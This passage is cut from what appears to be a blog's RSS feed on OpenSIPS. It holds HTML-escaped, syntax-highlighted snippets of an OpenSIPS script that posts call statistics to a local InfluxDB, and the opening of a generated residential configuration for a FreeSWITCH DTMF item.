&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;out_us&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;tot&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;result&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cache_counter_fetch&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tot_sec&amp;#34;&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;out&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cache_counter_fetch&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tot_usec&amp;#34;&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;out_us&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cache_counter_fetch&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tot&amp;#34;&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;tot&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cache_remove&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tot_sec&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cache_remove&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tot_usec&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cache_remove&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tot&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;tot&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!math_eval&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;(&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(out) + (&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(out_us) / 1000000)) / &lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(tot)&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(result)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;math eval error &lt;/span&gt;$rc&lt;span style=&#34;color:#e6db74&#34;&gt;\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;store_influxdb, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fsdemo&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pdd&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;serverB&amp;#34;&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;result&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#route [lb_route]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#	xlog(&amp;#34;foo: $(avp(lb_loads)[*])\n&amp;#34;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#	route(store_influxdb, &amp;#34;fsdemo&amp;#34;, &amp;#34;bal&amp;#34;, &amp;#34;serverA&amp;#34;, $(avp(lb_loads)[0]));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#	if ($(avp(lb_loads)[1]) != NULL) {&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#		route(store_influxdb, &amp;#34;fsdemo&amp;#34;, &amp;#34;bal&amp;#34;, &amp;#34;serverB&amp;#34;, $(avp(lb_loads)[1]));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#	}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;store_influxdb&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;body&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $param&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; + &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;,host=&amp;#34;&lt;/span&gt; + $param&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; + &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; value=&amp;#34;&lt;/span&gt; + $param&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;4&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;XXX posting: &lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(body) (&lt;/span&gt;$param&lt;span style=&#34;color:#e6db74&#34;&gt;(1) / &lt;/span&gt;$param&lt;span style=&#34;color:#e6db74&#34;&gt;(2) / &lt;/span&gt;$param&lt;span style=&#34;color:#e6db74&#34;&gt;(4))\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!rest_post&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://localhost:8086/write?db=&lt;/span&gt;$param&lt;span style=&#34;color:#e6db74&#34;&gt;(1)&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(body)&amp;#34;&lt;/span&gt;, , &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(body)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ERR in rest_post!\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;timer_route &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;dump_reply_stats, 1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;nr&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cache_counter_fetch&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;neg_replies&amp;#34;&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;nr&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cache_remove&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;neg_replies&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;store_influxdb, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fsdemo&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;neg&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;serverB&amp;#34;&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;nr&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;store_influxdb, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fsdemo&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rpl&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;serverB&amp;#34;&lt;/span&gt;, $stat&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;rcv_replies&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;XXX stats: &lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(nr)\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>freeswitch-dtmf-language</title>
      <link>https://wdd.js.org/opensips/ch8/dtmf-lan/</link>
      <pubDate>Tue, 02 Jul 2019 22:34:27 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch8/dtmf-lan/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# OpenSIPS residential configuration script&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#     by OpenSIPS Solutions &amp;lt;team@opensips-solutions.com&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# This script was generated via &amp;#34;make menuconfig&amp;#34;, from&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   the &amp;#34;Residential&amp;#34; scenario.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# You can enable / disable more features / functionalities by&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   re-generating the scenario with different options.#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Please refer to the Core CookBook at:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#      http://www.opensips.org/Resources/DocsCookbooks&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# for a explanation of possible statements, functions and parameters.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;####### Global Parameters #########&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_level&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_stderror&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_facility&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;LOG_LOCAL0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;children&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* uncomment the following lines to enable debugging */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#debug_mode=yes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* uncomment the next line to enable the auto temporary blacklisting of 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   not available destinations &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default disabled&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#disable_dns_blacklist=no&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* uncomment the next line to enable IPv6 lookup after IPv4 dns 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   lookup failures &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default disabled&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#dns_try_ipv6=yes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* comment the next line to enable the auto discovery of local aliases
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   based on revers DNS on IPs */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;auto_aliases&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;listen &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; udp:10.0.0.10:5060
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;####### Modules Section ########&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#set module path&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mpath&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/local/lib/opensips/modules/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### SIGNALING module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;signaling.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### StateLess module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sl.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### Transaction Module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fr_timeout&amp;#34;&lt;/span&gt;, 5&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
